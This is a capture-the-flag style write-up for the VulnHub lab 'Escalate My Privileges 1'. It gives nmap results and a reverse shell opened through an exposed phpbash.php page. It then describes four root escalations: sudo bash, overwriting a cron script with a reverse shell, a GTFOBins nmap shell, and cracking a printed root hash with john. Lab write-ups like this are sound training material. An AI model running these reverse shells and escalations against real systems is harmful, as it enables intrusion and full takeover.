
https://www.vulnhub.com/entry/escalate-my-privileges-1,448/

---
\[OS]: 
\[Web-Technology]: 
\[Hostname]:  
\[IP]:  192.168.56.111 
\[USERS]:  apache, armour, root
\[CREDENTIALS]:  

armour :: b7bc8489abe360486b4b19dbc242e885)

---
\[To-Try LIST]:  

**HTTP**
80 - 

**RPC**
111

**NFS**
2049

**mountd**
20048

**SSH**
22 - ssh - needs cred




---
\[NMAP RESULTS]:  
PORT      STATE  SERVICE VERSION
22/tcp    open   ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 61:16:10:91:bd:d7:6c:06:df:a2:b9:b5:b9:3b:dd:b6 (RSA)
|   256 0e:a4:c9:fc:de:53:f6:1d:de:a9:de:e4:21:34:7d:1a (ECDSA)
|_  256 ec:27:1e:42:65:1c:4a:3b:93:1c:a1:75:be:00:22:0d (ED25519)
80/tcp    open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-title: Check your Privilege
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
| http-robots.txt: 1 disallowed entry 
|_/phpbash.php
111/tcp   open   rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100003  3,4         2049/udp   nfs
|   100003  3,4         2049/udp6  nfs
|   100005  1,2,3      20048/tcp   mountd
|   100005  1,2,3      20048/tcp6  mountd
|   100005  1,2,3      20048/udp   mountd
|   100005  1,2,3      20048/udp6  mountd
|   100021  1,3,4      34915/udp6  nlockmgr
|   100021  1,3,4      37666/tcp   nlockmgr
|   100021  1,3,4      45804/tcp6  nlockmgr
|   100021  1,3,4      51147/udp   nlockmgr
|   100024  1          38767/udp   status
|   100024  1          50649/udp6  status
|   100024  1          57861/tcp6  status
|   100024  1          60724/tcp   status
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
875/tcp   closed unknown
2049/tcp  open   nfs_acl 3 (RPC #100227)
20048/tcp open   mountd  1-3 (RPC #100005)
42955/tcp closed unknown
46666/tcp closed unknown
54302/tcp closed unknown



--- 

\[Web Services Enumeration]:   

Site Exploration / View Source -> Nothing


/robots.txt -> **/phpbash.php**

```bash
# http://192.168.56.111/phpbash.php -> /var/www/html user
bash -i >& /dev/tcp/192.168.56.101/4444 0>&1

# Host nc -nlvp 4444 - connected - get tty and continue





```


---


\[OTHER / PRIVILEGE-ESCALATION]:   

```bash
bash-4.2$ cat readme.txt 
HI 
Find Armour User backup in /backup

ls -la /backup/armour
ls -la /home/armour #Credentials.txt backup.sh runme.sh

cat Credentials.txt
my password is md5(rootroot1) #(this is b7bc8489abe360486b4b19dbc242e885)

Both backup.sh and runme.sh are owned by root and world writable # same diff

cat /etc/shadow - root and armour hashes are visible

su - armour #password :: b7bc8489abe360486b4b19dbc242e885)

# Method 1: sudo

# we are armour now
sudo -l  #armour can run all cmds no passwords on my_privilege

sudo /bin/bash #root shell
whoami
cd /root

[root@my_privilege ~]# cat proof.txt
Best of Luck
628435356e49f976bab2c04948d22fe4


# Method 2: return to armour
# We already found backup.sh and runme.sh are writable and run as root
cat /etc/crontab #backup.sh runs minutely

echo 'bash -i >& /dev/tcp/192.168.56.101/5555 0>&1' > backup.sh 

#nc -nlvp 5555 - almost instantly got root connection

# Method 3: SUIDs 
find / -perm -u=s -type f 2>/dev/null

# genuinely tons to choose from but I'll go with nmap - gtfobins
TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
sudo nmap --script=$TF

#works

# Method 4: remember shadow was readable - rootroot1 was crackable for armour
# It was on line 4171602:rootroot1 so would takke about 20  mins

cat /etc/shadow | grep root


echo '$6$lYoxb/H/0LQ5d50Q$mM2ej4Um6zmkg11uszJrBpZo/vI4TT6nEvQnlnI/GlB9otfNIyN9xXfATAxVAUzj4ojTE1pmFbY12NUzw2j/b0'  >  root.hash

john --wordlist=/usr/share/wordlists/rockyou.txt root.hash 
```

--- 
Take Away Concepts: 



HOTKEYS! 
Background: Black 
Foreground (important elements): Red 
Background-Color: Select Text > Shift + Alt + B + ENTER 
Foreground Color: Select Text > Shift + Alt + F + ENTER 
Move quickly with: Function key + left and right arrows 
Cntrl + left and right arrows 
Cntrl + Shift (select text) (edited)
